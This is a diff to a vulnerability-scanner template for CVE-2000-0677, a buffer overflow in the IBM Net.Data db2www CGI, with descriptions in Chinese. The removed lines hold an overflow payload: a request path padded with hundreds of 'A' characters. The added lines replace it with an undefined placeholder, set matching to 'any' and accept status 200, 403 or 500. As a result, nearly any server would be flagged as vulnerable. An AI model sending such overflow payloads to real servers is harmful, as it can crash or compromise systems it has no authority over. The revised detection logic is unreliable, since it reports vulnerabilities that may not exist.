@@ -1,8 +1,8 @@
 [info]
-author = "AVE"
-description = "检测 IBM Net.Data db2www CGI 程序缓冲区溢出漏洞（CVE-2000-0677）。远程攻击者通过向 CGI 发送超长 PATH_INFO 环境变量可触发基于栈的缓冲区溢出，导致任意代码执行。无需认证，远程利用。"
+author = "ave"
+description = "通过向 IBM Net.Data db2www CGI 程序发送超长 PATH_INFO 环境变量，触发缓冲区溢出，验证目标是否存在该漏洞。发送大量字符作为 PATH_INFO 值，观察服务器响应状态码或返回内容判断漏洞存在。"
 id = "POC-AVE-2000-1408"
-name = "IBM Net.Data db2www CGI Buffer Overflow Detection"
+name = "IBM Net.Data db2www CGI 缓冲区溢出远程代码执行漏洞 PoC"
 severity = "critical"
 tags = ["ave-2000-1408"]
 vuln_id = [
@@ -11,19 +11,36 @@ vuln_id = [
 ]
 
 [poc]
-logic = "all"
+logic = "any"
 
 [[poc.requests]]
 method = "GET"
-path = "/{{BaseURL}}/cgi-bin/db2www/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
+path = "/{{BaseURL}}/db2www/{{path_info}}"
 protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    200,
+    403,
+]
+type = "status"
 
 [[poc.requests.matchers]]
 expect = true
 part = "body"
 type = "word"
 words = [
-    "IBM",
-    "Net.Data",
-    "db2www",
+    "segmentation",
+    "buffer overflow",
+    "core dumped",
+    "internal error",
 ]
